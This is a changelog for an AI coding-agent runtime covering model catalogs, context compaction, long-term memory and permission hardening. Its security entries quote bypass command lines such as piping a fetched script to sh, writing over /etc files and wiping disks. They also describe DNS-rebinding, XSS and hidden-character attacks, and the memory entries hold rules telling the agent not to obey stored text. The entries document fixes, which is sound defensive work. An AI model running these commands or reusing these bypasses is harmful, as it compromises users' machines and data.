## [Unreleased]

### Added

- **About 190 more providers, called with the generic OpenAI-compatible client, and their models.** The providers of the models.dev catalog that speak the OpenAI chat completions protocol and that the runtime does not have built in (groq-like gateways, siliconflow, together, nvidia, huggingface, fireworks and the rest) are now usable: name one in a model string (`siliconflow:model-id`, which used to fall back to Anthropic with the whole string as the model), set the key variable the catalog names for it, and the client calls its catalog base URL. `sdk.CatalogProviders()` lists them, `config.AvailableCatalogProviders()` gives them with their models and setup fields (kept apart from `AvailableProviders()` so a host that lists providers does not suddenly list 190 more), and `ClientConfig.CatalogCacheDir` / `RefreshCatalog` apply the cached catalog and, if asked, refresh it in the background. For the models of the built-in providers too, the catalog fills in what our own list does not have (context window, image input, cost) and never overrides it; an output limit equal to the window is taken as unknown. A provider that only a downloaded catalog knows is `Unverified` and gets no config of its own, so a key is never sent to a URL nobody confirmed. In the terminal app the providers are in the provider and model pickers, a palette command refreshes the catalog by hand, and `options.refresh_model_catalog` (or `SESHAT_REFRESH_CATALOG`) lets it refresh by itself; the online refresh is off by default.

- **A catalog of 230 providers and about 7,900 models, embedded and refreshable (`internal/catalog`).** It is the models.dev data that opencode builds its provider list from, trimmed to what an agent can use (text output, tool calls): the base URL and API key variable of each provider, and for each model its context window, output limit, image and audio input, reasoning, cost and status. The snapshot embedded in the binary (150 KB compressed, rebuilt with `scripts/build-catalog-snapshot.js`) is the floor: nothing needs the network. `catalog.Refresh` fetches the public catalog into a cache directory and `catalog.Load` merges it over the embedded one. The merge is a security rule: a provider that is in the embedded snapshot keeps its base URL, API key variable and protocol whatever a fetched catalog says, so a catalog cannot send a key somewhere else; a provider that only the fetched catalog has is added as `Unverified`, and its URL must be confirmed by the user before a key is sent. Our own model catalog still wins over it, and an output limit equal to the context window is treated as unknown. Nothing uses it yet: the next changes read model data from it and offer its OpenAI-compatible providers.

- **29 models added to the catalog, taken from the models.dev data that opencode bundles.** Anthropic (`claude-fable-5`, `claude-opus-4-7`, `claude-opus-4-6`, `claude-opus-4-5`, `claude-haiku-4-5`, `claude-sonnet-4-5`), OpenAI (`gpt-5.6`, `gpt-5.6-sol`, `gpt-5.6-luna`, `gpt-5.4`, `gpt-5.4-mini`, `gpt-5.4-nano`), Gemini (`gemini-3.7-flash`, `gemini-3.5-flash`, `gemini-3.1-flash-lite`, `gemini-flash-latest`, `gemini-flash-lite-latest`), MiniMax (`MiniMax-M2.7-highspeed`, `MiniMax-M2.5-highspeed`, `MiniMax-M2`) and Z.ai (`glm-5v-turbo`, `glm-5-turbo`, `glm-4.7-flash`, `glm-4.7-flashx`, `glm-4.6`, `glm-4.6v`, `glm-4.5`, `glm-4.5-air`, `glm-4.5-flash`). `glm-4.5-air` is the summary model of the default compaction rule for z.ai sessions and was not in the catalog, so its window was unknown. `scripts/add-models-from-catalog.js` generates the entries from a snapshot and a list, copying each provider's own conventions. Two tests guard the catalog: well-formed entries (no duplicate, output no larger than the context, a temperature) and the presence of the default compaction models. The limit differences between our catalog and the snapshot were left alone: see `analyse-catalogue-modeles-opencode-2026-10-19.md` in seshat-ai.

## [1.10.4] - 2026-10-18

### Added

- **The list of deferred tools in the system prompt gives each tool a one-line description.** The agent saw only the names (`git_status`, `lsp`, `repo_map`...) of the tools it must find with `tool_search`, which tells little for a name like `monitor`. Each line is now `name: what it is for`, taken from the tool's new `ShortDescription` field, else from a line written for each of the built-in deferred tools (a test requires one for every tool of the enterprise profile), else from the first sentence of its description (what an MCP tool gets). For the 54 deferred tools of the desktop profile the list costs about 900 tokens, against about 200 for the names alone, in the part of the prompt that is not cached; the profile saves about 16k.
- **`sdk.EnterpriseAgentTools()` and `sdk.EnterpriseAgentDeferredTools()` give a host the tool profile of a general agent in a company setting.** They are the lists the desktop application needs for `ClientConfig.MainAgentTools` and `MainAgentDeferredTools` (with `EnableToolSearch`): 38 tools loaded at every request, the rest findable with `tool_search`, MCP tools deferred by themselves. Measured on a default client: 35.5k tokens of tool definitions for every registered tool against 19.4k for the profile (about 45% less); the heaviest loaded definitions are bash, agent, grep, read_file and ask_user_question (4 to 6 KB each). Tests guard the lists against stale names and the size against growth.

### Fixed

- **`ClientConfig.EnableToolSearch` now also gives the model the `tool_search` tool.** The option hides the deferred tools from the model, but the tool that finds them followed only the `ENABLE_TOOL_SEARCH` environment variable, so a host that set the option (and `MainAgentDeferredTools`) offered a model that could not reach the tools it had hidden. Found by building a session with the desktop profile: its tool list had no `tool_search`.

## [1.10.3] - 2026-10-18

### Added

- **A backslash at the start of the prompt lists the palette commands above the prompt, like `/` does for skills.** Type `` (then a few letters to filter) and pick a command with Enter; the last entry, "All Commands…", opens the full command dialog, which the backslash used to open directly. A backslash anywhere else is left alone, since it is usually part of a Windows path.

- **The terminal app shows what memory holds and lets you forget it, from the command palette.** "Memory: Show Notes" lists the notes, "Memory: Forget a Note" asks for a name and removes that note, and "Memory: Undo Last Change" goes back to the copy taken before the last change (a forget or a consolidation). The answer is shown to you and never sent to the agent.

- **Run a shell command from the prompt of the terminal app, without starting the agent, with its output in a panel.** `!pip install rich` runs the command and shows its output in a panel next to the chat (at the right on a wide screen, under it on a narrow one), scrollable with the mouse wheel; nothing of it goes in the conversation, so it is not stored in the transcript, compacted, read by memory or paid for in tokens. The command palette has Command Panel entries to show or hide it, to move between the last 20 commands, to clear it, and to share the output with the agent (it is then placed, cut to its start and end if long, in front of the next message). `!!cmd` runs a command and shares its output without that step. `:!cmd` gives the real terminal to the command until it ends, which is what a password prompt, `sudo su`, `ssh` or an editor needs: the program is suspended meanwhile and the password never goes through it. A `!` command is captured with no keyboard input, stopped after 5 minutes, keeps the first megabyte of its output, and keeps no state between commands (a `cd` does not carry over).
- **The terminal app can learn from conversations, on request.** `options.memory_enabled` in the app config (or `SESHAT_MEMORY_ENABLED`, and `SESHAT_MEMORY_CONSOLIDATE` to let memory be rewritten smaller) turns on extraction, recall and, at each start, the catch-up of earlier sessions that were left open. It is off until the user chooses; the command palette has "Toggle Learning From Conversations", which applies from the next start.
- **Memory notes can be listed and forgotten, and forgetting can be undone.** `ListMemoryNotes` returns everything memory holds about a user, `ForgetMemoryNote` removes one note with its relations after copying memory (so `RestoreMemorySnapshot` puts it back), and `Client.LongTermMemory()` gives a host the store the client uses. They need a store that can list and rewrite its entities, such as the SQLite one.

- **`Client.ExtractPendingMemories` reads the sessions that were never closed.** `ExtractMemories` runs when a session closes, but a host that keeps its sessions open (the SeshatOS backend never closes one) or a crash would never trigger it. `ExtractPendingMemories(ctx, userID, PendingMemoryOptions)` reads the idle sessions (untouched for 30 minutes by default, not older than 7 days, at most 10 per call, most recent first) that were not read yet, and marks each one (`memory_extracted_at` in its metadata) once its extraction succeeded, so a session is read once and a failed one is tried again next time. A normal close marks its session too. It does nothing when `ExtractMemories` is off.

### Fixed

- **Choosing a command in the popup opened by a backslash now runs it.** The selection was handed to the dialogs, which had none open, so nothing happened. The popup now applies the command itself. Quit, from the palette or the popup, now opens the confirmation dialog like `ctrl+c` does instead of closing the app at once.
- **`@` and `/` in the terminal app work where the cursor is, not only at the end of the prompt.** The popup opened by a trigger typed after a space looked at the last character of the whole text, and the chosen file or skill was put back by moving the cursor to the end. Both now use the cursor position, so a mention can be added in the middle of a sentence you are editing and the cursor stays right after it.

## [1.10.2] - 2026-10-18

### Added

- **The compaction summary is written by a small model of the session's own family, chosen by rules.** A summary is reading and condensing, not reasoning, and a reasoning model spends its output budget thinking (z.ai's `glm-5.3-flash` took 200 seconds to compact where `glm-4.5` took 20). `ClientConfig.CompactModelRules` map a session's provider and model (an exact name or a prefix such as `glm-*`) to the model that writes the summary, first match wins; `CompactSummaryModel`, when set, still wins over everything. Built-in rules, switched off by `NoDefaultCompactModels`, give a z.ai session `glm-4.5-air` and an Anthropic session `claude-haiku-5-5`; a provider with no rule keeps its own model until a measurement shows a better one. A rule's model stays on the session's provider unless the rule names another (so the conversation does not go to a vendor the session did not choose), and a model chosen by a rule is skipped when its window cannot hold the request and its summary. Measured on `glm-4.5` at the exact auto-compaction threshold (107,495 tokens, thinking disabled): summary by `glm-4.5`, `glm-4.5-air` and `glm-4.7` all kept the same 8 of 12 planted facts and left 71,700 to 72,000 tokens, in 22, 16 and 21 seconds; with the built-in rule the whole compaction took 6 seconds.
- **A memory consolidation can be undone.** Consolidation rewrites a user's memory on a model's judgement; the refusal thresholds stop the worst results, but a plausible rewrite that dropped something that mattered would have been gone for good. Memory (entities and relations) is now copied before it is rewritten, into a new `memory_snapshots` table (migration `20261018_018`), ten copies kept per user. `sdk.ListMemorySnapshots` and `sdk.RestoreMemorySnapshot` put a copy back (the memory it replaces is copied first, so a restore can be undone too), and `Consolidator.UndoLast` undoes the latest consolidation. Consolidation refuses to run, before it calls a model, with a store that cannot take a copy: the new `Snapshotter` interface is what a host with its own store implements to allow it.

### Fixed

- **The summary request fits the window of the model that writes it, and survives a rejection.** A compaction sent everything it dropped to the summarizing model without checking it against that model's window (which can be smaller than the session's once a cheaper model writes the summary, or exceeded after a conversation jumps past the threshold). The request is now sized to the model's window less room for the summary, leaving out the oldest messages first and saying how many; if a provider still rejects it as too long (matched on the wording of the error, since there is no common code), it is sent again at 70 %, 50 % and 35 % of its size, the approach opencode takes. A reply that does not follow the six numbered sections is sent back once with a reminder, and used as it is if it still does not, because a summary a little off beats a compaction that fails. Checked live on `glm-4.5` at the exact auto-compaction threshold: 107,495 tokens down to 71,821, same facts kept.
- **A summary that cannot be written no longer ends the turn, and no longer leaves the conversation to overflow.** When the automatic compaction failed (a model that returns nothing, a provider that is down), the turn ended with an error, and after three failures the circuit breaker stopped compaction for good, so the next overflow went straight to the provider. A failed summary is now logged and counted, and the turn goes on. If the request is then over the hard limit, the new `Engine.EmergencyTrim` shrinks it without asking a model: it trims the large tool results and, if that is not enough, drops the oldest messages (tool calls and their results kept together) behind a marker saying that the earlier part could not be summarized, keeping the newest up to the compaction target. The dropped messages are archived like those of any compaction. Only a request that cannot be shrunk at all (nothing older than the last message) still fails locally with the typed `compact_full` error.
- **Compaction brings the conversation down further.** Measured on a real agent conversation sized exactly at the automatic threshold (330 messages, 107,495 tokens, `glm-4.5`, 128k window): after compaction it held 84,784 tokens, far above the 63,000 target, because the user's earlier messages carried over word for word could take 20,000 tokens, 15 % of that window, so compaction at 85 % ended near 80 % and would run again almost at once. They are now capped at 5 % of the model's effective window (still at most 20,000 tokens): 71,730 tokens after, with the same facts kept. A new live benchmark (`TestLiveAutoCompactionAtTheThreshold`, build tag `live`, `scripts/live-conv-from-hf.py` builds its conversation from real SWE-agent trajectories) measures this.
- **Compaction no longer fails on reasoning models.** Found by running it against `glm-5.3-flash` on z.ai: the summary request had a budget of 2,000 tokens, a reasoning model spent all of it thinking (stop reason `max_tokens`, a thinking block and no text), the summary came back empty, and after three such failures the circuit breaker stopped compaction for good. Summary requests now ask z.ai not to reason first (`thinking: disabled`, new `APIRequest.DisableThinking`, ignored by providers without a known switch), and when a model still returns no text the request is repeated once with a four times larger budget (up to 16,000) before it is given up; the error says the stop reason.
- **Trimming a message for a summary request no longer trims the conversation itself.** `PrepareMessageForAPI` wrote into the content slice it shares with the caller's message, so a compaction that failed left the session's tool results trimmed anyway.
- **Manual compaction now compacts, and automatic compaction keeps a smaller tail.** Found by running it against a real model: asked on a small conversation, `Session.Compact` did nothing (3,965 tokens before and after), because it reused the automatic rules, which assume a nearly full window. A manual compaction now always summarizes and keeps the most recent fifth. It was also growing a conversation with a long pasted log (8,249 tokens became 4,098 on the first try) because the kept tail was "at least" the target, so one giant message swallowed everything before it; the tail now stays within the target and keeps at least the last message, for automatic compaction too. The user's earlier messages carried over word for word are clipped to 2,000 characters each. `Compact` returns `ErrCompactionWouldNotShrink`, changing nothing, when summarizing would leave the conversation no smaller.

## [1.10.1] - 2026-10-18

### Changed

- **The skill list in the `skill` tool is capped at 8,000 characters.** Before, every skill added its description, when-to-use and triggers to every request with no limit. Now each description is cut at 1,024 characters, and a list over the budget degrades by levels: descriptions only, then descriptions shortened evenly, then names only, then as many names as fit with a count of the rest. A shortened list says so. Lists within the budget are unchanged.

### Added

- **A compaction no longer deletes the conversation.** It used to replace the stored transcript with the compacted one, so the messages it dropped were gone: after a compaction a session held a summary and its last messages, and the desktop, which reads its messages from that transcript, lost the scrollback (measured: 8 messages before, 4 stored entries after, in the memory and file stores). The dropped messages are now rewritten in the transcript with the new entry type `archived`: they are not sent to the model and not restored into the session (the canonical messages ignore them), but they stay stored and searchable, and a second compaction adds to the archive. `Session.History()` returns the whole conversation as `Archived` (oldest first) and `Current`; `GetMessages` still returns only what the model sees. A rewrite that is not a compaction (a rewind, an interrupted turn) replaces the transcript as before. Tested on the memory, file and SQLite stores, and end to end with a real compaction. No migration: an older session has nothing archived.

### Fixed

- **The browse agent no longer lists five tools that do not exist** (`tree`, `wikipedia`, `scholarly_search`, `web_map`, `web_crawl`). Its allowlist now holds only registered tools, and a test fails if a name matches none.
- **MCP tools reached the model with no parameters.** The schema an MCP server sends for a tool is a whole JSON schema, but it was nested a second time as the `properties` of a new one, so the model saw `{"properties":{"properties":{}}}` and had to guess every argument name. The server's schema is now converted as is, with its properties and required list.

### Removed

- **The tools that wrote Word, Excel and PDF files are gone** (`docx_edit`, `excel_edit`, `write_pdf`). They were too limited to be worth their 1,300 tokens in every request. `read_file` is unchanged and still reads PDF, Word, PowerPoint and Excel. To write those formats, use a skill (for example a document skill from the skill store) or Python through `bash`. The `fpdf` dependency goes with them.

### Security

- **The terminal UI opens only http(s) links.** The sign-in address comes from the provider's answer and was handed to the system opener as it was, which also starts programs for `file:` and other registered schemes. Anything that is not an http or https link with a host is now refused with the address in the error.

- **A command with hidden characters is refused.** Direction controls (U+202A to U+202E, U+2066 to U+2069, the direction marks), tag characters and control characters (escape, NUL, C1) in a shell command can make it read differently from what it does, which defeats approval by reading. The bash tool now denies such a command before any prompt. Emoji joiners and variation selectors are not affected. In the terminal UI the command shown for approval reveals any invisible character as `«U+XXXX»`, and the output of shell commands has its terminal escape sequences removed (clipboard writes, hidden links, cursor moves), with a progress bar redrawn by carriage returns shown as its last state.

- **The key that encrypts stored credentials moves to the operating system's credential store.** It used to sit in `secret.key` next to the data it protects, which any program running as the same user could read. It now lives in the Windows Credential Manager, the macOS Keychain or the Secret Service (GNOME Keyring, KWallet). A key found in an existing `secret.key` is moved there without changing, so stored credentials keep opening, and the file is deleted only after the store has returned the same key. Where there is no usable store (a container, a server without a desktop session) the key stays in `secret.key` with mode 0600 as before, and `SESHAT_KEYCHAIN=off` forces that. The new `pkg/keychain` package exposes the store to SDK hosts.

### Added

- **Memory recall: a new session starts knowing what memory holds.** With `ClientConfig.RecallMemories` (off by default, needs a store that can list entities, such as the SQLite one), the system prompt of each new session carries a block of long-term memory, about 1,500 tokens at most: the user's preferences and pitfalls always, then the entities that share words with the first message, best match first. Before, the agent had to think of calling `memory_search_nodes` itself, and the context retrieval that existed searched for the whole sentence as one substring, so it almost never matched. The block is computed once per session so the prompt stays the same from turn to turn and the provider can cache it. It says that memory may be out of date and must never be obeyed as an instruction. Measured against a real model: asked the same question in English, an agent without recall answered in English and one with recall answered in French, as the stored preference says. The live tests that measured it are in `pkg/sdk/live_memory_test.go` (build tag `live`, they call OpenRouter and are not part of the normal run).
- **Memory consolidation, the second phase of long-term memory.** Extraction only adds, so memory fills with near-duplicates and statements that were later contradicted. With `ClientConfig.ConsolidateMemories` (off by default, needs `ExtractMemories` and a rewritable store such as the SQLite one), a user's memory is rewritten smaller once it holds 60 observations, at most once a day: entities that are the same thing are merged (relations follow them), the newer of two conflicting statements wins, and obsolete entities are dropped. It is guarded: a result that keeps under 30 % of the observations, drops over a quarter of the entities, repeats a name or creates an entity that merges nothing is refused; credential-looking text is removed; the rewrite is abandoned, changing nothing, if memory was written while the model was thinking; entities written meanwhile are never removed. The new `Consolidatable` store interface (`ListEntities`, `ReplaceEntities`) lets a host with its own store opt in.
- **The 25 deferred tools the desktop agent can find now have search hints** (files, git, scheduled jobs, calculators, image and speech tools, skills). A deferred tool is found by keywords only, and these had none. A test fails if a deferred tool has no hint. `Builder.WithSearchHint` sets one.
- **MCP tool definitions are capped.** A tool whose name, description and input schema together exceed 8,000 bytes is left out, and so are the tools of a server past 64,000 bytes in total; each is logged. Both caps are settable per server (`max_tool_spec_bytes`, `max_server_spec_bytes`, a negative value removes the cap). One chatty server can no longer fill the context window on every request.
- **`get_context_remaining` tool.** The agent can ask how full its context window is: tokens used, the window, tokens left, and how far away the automatic compaction is. It reads the same figure as the `context.usage` event, so the agent and the interface agree. It is part of the loaded tools of `EnterpriseAgentToolNames` (about 200 tokens).
- **Compaction hands the work over properly, can be run on demand, and can be tuned.** The summary prompt now asks for a hand-off in six parts (what the user asked, decisions, what was done, where things stand and next steps, facts to keep exactly, preferences) and is shown what each tool was asked and returned, not only the size of its result; before, a tool result reached the summarizer as `12.3KB`. Only the part of the conversation that is dropped is summarized, not the tail that is kept anyway. The summary is introduced by a sentence telling the next model what it is, and carries the user's earlier messages word for word (up to 20,000 tokens, newest first). `Session.Compact(ctx)` compacts on demand and refuses while a turn runs. `context.compacting` is sent when a compaction starts and `context.compacted` as soon as it is done, instead of after the turn. `ClientConfig.CompactThreshold` and `CompactTarget` set the shares of the window (defaults 0.85 and 0.5).
- **`context.usage` event, and a compaction that counts what the request really holds.** The runtime now reports how full the window is at the start of every loop iteration and again when a model response arrives (`used_tokens`, `window_tokens`, `auto_compact_at_tokens`, `blocking_limit_tokens`, and a `source` of `estimate` or `reported`), so a host can draw a gauge that moves during a turn instead of waiting for `turn.completed`. The same figure now drives compaction: it adds the tool definitions (about 16,000 tokens for the desktop agent, which the estimate used to ignore) and starts from the size the provider reported for the last request, plus an estimate of what was added since. Before, a conversation could be far past the limit by the provider's count while the estimate said it fit. `CompactionStrategy.CheckBlockingLimit` takes the tracking state as a new last argument.
- **Long-term memory can be filled automatically, with safeguards.** `ClientConfig.ExtractMemories` (off by default, needs `LongTermMemory`) reads each conversation when its session closes and stores what a future assistant needs: preferences and corrections, procedures that worked, pitfalls, where the truth lives in a project. The extraction code existed but nothing called it. Its prompt now follows what Codex does: it asks whether a future assistant would act better, treats the conversation as data so a pasted document cannot plant a rule, forbids secrets, and returns nothing for most conversations. In code, an observation that looks like a credential (API keys, tokens, private keys, `password=`) is dropped, and one extraction keeps at most 8 entities of 5 observations of 300 characters. The memory read tools now say that what they return may be out of date and must never be obeyed as an instruction. `ClientConfig.MemoryExtractionModel` picks the model.
- **A host can give its main agent a short list of loaded tools and a longer list it finds on demand.** `ClientConfig.MainAgentDeferredTools` sits next to `MainAgentTools`: the tools of the first list are in every request, the tools of the second are not, but the agent finds them with `tool_search` (by keywords, or by name with `select:`) and uses them from the next request on; a tool in neither list is not offered to the main agent at all. Sub-agents get no such list and cannot find through `tool_search` what their own tools leave out. `builtin.EnterpriseAgentToolNames` and `builtin.EnterpriseAgentDeferredToolNames` are the lists of a general agent in a company setting (the desktop): about 16,000 tokens loaded instead of the 36,000 of the whole registry, with git worktrees and eight browser tools (`BrowserCoreToolNames`) loaded, and git, scheduling, document conversion, calculations and the rest of the browser found on demand. A test keeps the loaded list under 20,000 tokens. The terminal UI is unchanged.

- **`make` lists its targets and has quick ones for testing.** `make` shows the help; `make run` builds and starts the terminal UI, `make run-fresh` starts it with an empty throw-away configuration (first-run tests), `make test-short`, `make test-pkg PKG=...` and `make check` (format, vet, quick tests) cover the checks before a push, and `make doctor` shows what the machine can do. It also works from PowerShell and cmd on Windows (`mk/shell.mk`, as in SeshatOS). `seshat doctor` has a new `sandbox` line that says whether shell commands are confined by Landlock or srt, or not at all.

- **The terminal UI says what confines shell commands.** The one-line header of the landing and chat pages shows `landlock` or `srt` in the muted colour when commands are confined, and `not confined` in the error colour when nothing confines them (the sidebar, when a layout shows it, says the same in full).

- **Shell commands can be confined on macOS and Windows with `srt`.** Landlock only exists on Linux, so on the other systems commands ran with the user's full rights. When Anthropic's `srt` ([sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime), Apache-2.0, `npm i -g @anthropic-ai/sandbox-runtime`) is installed and works, the bash tool runs every command through it: writes only in the workspace and the temp folder, no reading of `~/.ssh`, `~/.aws`, `~/.gnupg` and similar, network only to common code hosts and package registries (`SESHAT_SRT_ALLOWED_DOMAINS` and `SESHAT_SRT_ALLOW_WRITE` add to the lists, `SESHAT_SRT=off` turns it off). srt is tried once with a trivial command first: if it is installed but cannot confine (on Windows it needs a one-time `srt windows-install` with a UAC prompt, and is alpha), Seshat logs what srt said and runs as before rather than failing every command. `SandboxBackend()` (Go SDK) and `sandbox_backend` in the config tool report `landlock`, `srt` or `none`, so an interface can say honestly when nothing confines the commands.

- **`install.sh` checks for ripgrep.** The glob and grep tools run ripgrep, and the Linux and macOS installer did not say so (the Windows one already installs it). It now installs it with Homebrew when there is one, and otherwise prints the exact command for the package manager it finds (apt, dnf, pacman, zypper or apk) instead of running `sudo` for you. `SESHAT_SKIP_RIPGREP=1` skips the check, as on Windows.

## [1.10.0] - 2026-10-17

### Security

- **`exit_plan_mode` asks the user to approve the plan.** Leaving plan mode is what grants write access, and the question the tool built was replaced by an allow before any prompt saw it, so the model could end plan mode alone. The permission engine now asks through the host's prompt function, with the plan in the message, unless the user already approved the plan in the review dialog (`submit_plan`). A host with no prompt function refuses the exit, as it does for any other tool that needs a question; an SDK host that wants plan mode without a prompt calls `Session.ApprovePlan` or `ClearPlanMode`. `never` and `bypass` modes are unchanged.

### Added

- **Sessions can be named by a small model that runs on your machine.** `seshat title-model install` downloads the llama.cpp server (a 12 to 19 MB CPU build) and Qwen2.5 0.5B Instruct (about 470 MB, or Gemma 3 270M with `--model gemma-3-270m`), checks both against SHA-256 sums fixed in seshat, then starts the model once to prove it answers. Titles are then made offline, for free, without showing the first message to the provider: about 0.4 s once the model is loaded and under 2 s the first time, measured on a laptop CPU. The server starts at the first title, stops after ten idle minutes and when seshat exits, and a server left behind by a run that was killed is found and stopped by the next run (it is only stopped if the port in its record still answers as a llama-server that has loaded this very model file, since process ids are reused). When the model is not installed, is turned off (`seshat title-model disable`) or fails, the chat provider names the session as before. Both installers offer it at the end (`SESHAT_TITLE_MODEL=1` installs it without asking, `0` skips it); it is never downloaded without being asked for.
- **`seshat` updates itself, and offers to when a release is published.** At start-up in a terminal it checks (once a day, 2 seconds at most, silent when offline) whether a newer release exists, and asks `Update now? [Y]es / [l]ater / [s]kip this version`. `seshat update` installs the latest release on demand (`--check`, `--yes`). The binary is downloaded from the GitHub release, checked against `SHA256SUMS.txt`, and put in place of the running one; on any failure the old binary is kept. Development builds, pipes and CI are never asked, and `SESHAT_NO_UPDATE_CHECK=1` turns the offer off.

### Changed

- **The terminal command and its interface moved to a module of their own, `tui/`.** Part of the interface comes from Crush and is under the Functional Source License, and anyone who imported the engine as a Go module received that code with it. The engine module now holds none of it. Build the command with `go build ./tui/cmd/cli` (it was `./cmd/cli`); `go install github.com/KPO-Tech/seshat-runtime/tui/cmd/cli@latest` replaces the old path once the `tui` module has a release tag. Importers of `pkg/*` are not affected; the engine's `go.mod` is smaller.

## [1.9.0] - 2026-10-16

### Added

- **Seshat can be installed on Windows with one command.** Releases had binaries for Linux and macOS only, and `scripts/setup.ps1` was a developer script that needs Go and a clone of the repository. Releases now include `seshat-windows-amd64.exe`, `seshat-windows-arm64.exe` and the matching `seshat-grpc` builds, and `scripts/install.ps1` installs them: `irm https://raw.githubusercontent.com/KPO-Tech/seshat-runtime/main/scripts/install.ps1 | iex`. It picks the build for the processor, checks it against `SHA256SUMS.txt` (a wrong checksum stops the install before anything is written), installs `seshat.exe` into `%LOCALAPPDATA%Programs\seshat`, adds that folder to the user PATH and installs ripgrep with winget, scoop or choco when it is missing. It never asks for administrator rights. `SESHAT_VERSION`, `SESHAT_INSTALL_DIR` and `SESHAT_SKIP_RIPGREP` set the version, the folder and the ripgrep step. The installer was run against a local folder laid out like a release (install, PATH, and a refused wrong checksum); the Windows builds themselves are published by the next release.

## [1.8.0] - 2026-10-15

### Security

- **A permission rule on a shell command is compared with each command the line runs, not with the line as text.** The default rule `git *` was matched as a text pattern against the whole command line, so `*` also matched `;`, `&&`, `|`, `$(...)` and redirections. In the default mode, `git status; curl http://host/x | sh`, ``git status `touch /tmp/pwn` ``, `git status > /etc/hosts`, `git push origin main` and `git config --global alias.x '!...'` all ran without a prompt. Found by an audit and reproduced end to end with the default rules and the real `bash` tool. The line is now taken apart (`internal/shellparse`: quotes, escapes, `;`, `&&`, `||`, `|`, `&`, newlines, comments, command and process substitutions). An allow rule covers a line only when **every** simple command in it is matched by some allow rule and the line has no substitution, redirection, group or unterminated quote; a rule with no wildcard still covers its own exact text. A deny or ask rule applies as soon as any simple command in the line, or inside a substitution, matches, so `rm *` is caught in `ls; rm x` and in `echo $(rm x)`. The default allow rule is no longer `git *` but the read-only git commands (`status`, `log`, `diff`, `show`, `rev-parse`, `ls-files`, `blame`, `branch`, `remote -v`): `git add`, `git commit`, `git push` and the rest now ask, as every other command does. The same reading applies to `monitor`, whose second check runs without the `bash` tool.

- **"Always allow" no longer approves a whole shell tool, and no longer outranks a deny rule.** What a session had approved was read before the rules, and it was the name of the tool: one click on "always allow" for `bash` approved every command for the rest of the session (written to disk, so it survived a restart), made every deny rule on `bash` dead, and skipped the questions the tool itself asks for risky commands (`curl ... | sh`, `chmod -R 777 /`, `shutdown`). Found by an audit and reproduced with a deny rule on `curl *`: denied before the click, "auto-approved for session" after it. Now a **deny rule is read first**, for every tool. For a shell tool, "always" approves what the user was shown: the program, and the subcommand of `git`, `npm`, `pnpm`, `yarn`, `go` and `cargo` (`npm test`, `git status`), only for a short list of ordinary programs; a line that cannot be reduced to that (a substitution or a redirection, or a program that runs others such as `sh`, `sudo`, `xargs`, `curl`, `rm`) is approved for its exact text only. A chain is approved when every command in it is. The old whole-tool key `bash` in an existing session's permissions file is ignored for shell commands. Other tools keep their whole-tool approval. An ask rule still yields to "always allow": it is how a tool is made to ask, and "always" is the answer.

- **`acceptEdits` approves one simple command at a time, and reads every path.** The mode decided from the first word of the line, so `ls\nrm -rf .`, `cat x | bash`, `ls | tee /etc/foo`, `find . -delete`, `find . -exec ...`, `sort -o /etc/passwd f` and `sed -n 'w /etc/x' f` were approved without a prompt as if they were a plain read or edit. Found by an audit and reproduced through the real `bash` tool. The mode now approves a line only when it is one simple command with no substitution or redirection; `find` with `-delete`, `-exec`, `-ok` or `-fprint*`, and `sort` with `-o`, `--output` or `--compress-program` are not reads; the write commands (`mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`) take a short list of options (`cp -t /etc`, `mv -T` and `rm --no-preserve-root` ask) and no quoted, escaped or expanded path (`$HOME/x`, `~/x`, `{/etc/x,y}`). `sed` and `uniq` are no longer approved by the mode: `sed` writes where its script says and `uniq` writes its second argument. Two path bugs went with it: an argument containing `=` was never checked (`touch /etc/x=y`), and on Windows `/etc/x` was joined to the working directory and read as a path inside it, because `filepath.IsAbs` says no to a POSIX path there, while the commands run in a POSIX shell. The same reading now applies to a direct call of the tool (without a tool context): the policy classes `ls\nrm -rf x` and `cat x | bash` as plain reads, so only a single simple command skips the approval there.

- **`monitor` applies the same hard checks as `bash`.** Its own permission check allowed every command, without the security checks, the git checks, the workspace checks or the catastrophic-command policy that `bash` applies to the same text; the question it then asks the user is a generic `bash` request that does not know them. `git push --force`, `git -c core.sshCommand=...`, `dd of=/dev/sda` and `mkfs` were refused by `bash` and started by `monitor`. It now runs the same checks, in its permission check and again when it is called directly.

- **The OAuth callback page escapes what it shows.** The error page copied `error_description` from the query into the HTML as it came, so a web page that sent the browser to the local callback during a sign-in could run a script in it (reflected XSS, found by `gosec`). It is escaped. The callback also closed its channel in two places, so a second request (a reload, a second redirect) panicked; it is closed once.

- **`web_fetch` dials the address it checked, not the name (DNS rebinding).** The network policy resolved the host, found every address public, and then the transport's dialer resolved the same name a second time to open the connection. A DNS record with a zero TTL answers a public address to the first question and `127.0.0.1` or a cloud metadata address (`169.254.169.254`) to the second, which got past the check. Found by an audit. `web.ResolveDialTarget` now returns the checked addresses and the transport dials one of them, in order, so nothing is resolved twice; the certificate is still verified against the host of the URL. `RejectLocalDialTarget` keeps its signature and uses the same function. With a proxy configured the transport dials the proxy and not the target, so the target is checked only where the URL is validated, as before; that is documented in the code.


### Added

- **`seshat terminal-setup` makes shift+Enter and ctrl+Enter insert a newline in Windows Terminal and the VS Code terminal.** A terminal sends the same byte for Enter, shift+Enter and ctrl+Enter, so the interface could only offer `ctrl+j`. The command writes the key bindings that make the terminal send the sequences the interface already decodes (`ESC [ 13 ; 2 u` and `ESC [ 13 ; 5 u`): the `actions` and `keybindings` of Windows Terminal (stable, preview and unpackaged) and the terminal key bindings of VS Code on Windows, macOS and Linux. The files are JSON with comments, so they are patched as text: what the user wrote and the comments are kept, a backup (`*.bak-before-seshat-keys`) is made first and kept as the very first original, nothing is written unless the result still parses, and a shift+enter binding the user already has is left alone. Running it twice changes nothing. `--check` shows what would change. `scripts/setup.ps1` and `scripts/setup.sh` offer it (`SESHAT_SETUP_YES=1` accepts, no console means no). The help at the bottom of the screen still says `ctrl+j`.

- **`ClientConfig.MainAgentTools` limits the tools the main agent is offered.** With no list the main agent still sees every enabled tool, about 94 of them (roughly 26,000 tokens of descriptions and schemas on every request). The terminal UI now passes `builtin.GeneralAgentToolNames()`, a core of about 27 tools (files, shell, web, plan and questions, tasks, sub-agents, skills and MCP). Sub-agents are not limited by it, so a `browse` sub-agent keeps its browser tools. The rest stay registered for specialised agents.

